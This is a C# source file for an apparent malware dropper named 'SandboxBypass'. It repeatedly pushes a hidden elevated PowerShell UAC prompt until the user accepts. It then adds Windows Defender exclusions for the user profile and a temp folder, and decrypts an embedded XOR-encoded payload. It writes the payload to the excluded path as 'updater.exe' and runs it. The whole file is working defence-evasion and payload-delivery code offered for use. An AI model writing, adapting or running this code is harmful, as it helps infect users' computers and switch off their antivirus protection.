using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Xml.XPath;


namespace SandboxBypass
{
    class Program
    {
        public static byte[] DecryptPayload(byte[] encryptedBytes)
        {
            byte[] decryptedPayload = new byte[encryptedBytes.Length];
            for (int i = 0; i < encryptedBytes.Length; i++)
            {
                decryptedPayload[i] = (byte)(encryptedBytes[i] ^ 0x69);
            }
            return decryptedPayload;
        }
        static async Task Main(string[] args)
        {
  
            string exclusionFolderPath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
            string exclusionFileFolderPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Temp\\tibKZb";
            string exclusionFilePath = exclusionFileFolderPath + "\\updater.exe";


            // Keep running in the loop until the user accepts the UAC prompt
            while (true)
            {
                try
                {
                    Process powershellProcess = new Process();
                    powershellProcess.StartInfo.FileName = "powershell.exe";
                    powershellProcess.StartInfo.UseShellExecute = true;
                    powershellProcess.StartInfo.Verb = "runas";
                    powershellProcess.StartInfo.CreateNoWindow = true;
                    powershellProcess.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                    powershellProcess.StartInfo.Arguments = "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command \"" +
                        "\n                    try {\n                        if (Get-Command Add-MpPreference -ErrorAction SilentlyContinue) {\n                            Add-MpPreference -ExclusionPath '" +
                        exclusionFolderPath +
                        "' -Force;\n                            Add-MpPreference -ExclusionPath '" +
                        exclusionFileFolderPath +
                        "' -Force;\n                            Add-MpPreference -ExclusionProcess '" +
                        exclusionFilePath +
                        "' -Force;\n                        }\n                    } catch { }\n                \"";
                    powershellProcess.Start();
                    powershellProcess.WaitForExit();
                    int exitCode = powershellProcess.ExitCode;
                    if (exitCode == 0)
                    {
                        break;
                    }
                }
                catch
                {
                    continue;
                }
            }

            // Now we can drop our payload and it's whitelisted in Defender :)

            Directory.CreateDirectory(exclusionFileFolderPath);

            // Decrypt our payload from resources
            Stream encrypted = System.Reflection.Assembly.GetExecutingAssembly().GetManifestResourceStream("SandboxBypass.payload.bin");
            var ms = new MemoryStream();
            await encrypted.CopyToAsync(ms);
            byte[] encryptedPayload = ms.ToArray();
            byte[] decryptedPayload = DecryptPayload(encryptedPayload);

            // Write the payload to already excluded path
            File.WriteAllBytes(exclusionFilePath, decryptedPayload);
            // Start the payload
            Process.Start(exclusionFilePath);

        }
    }
}
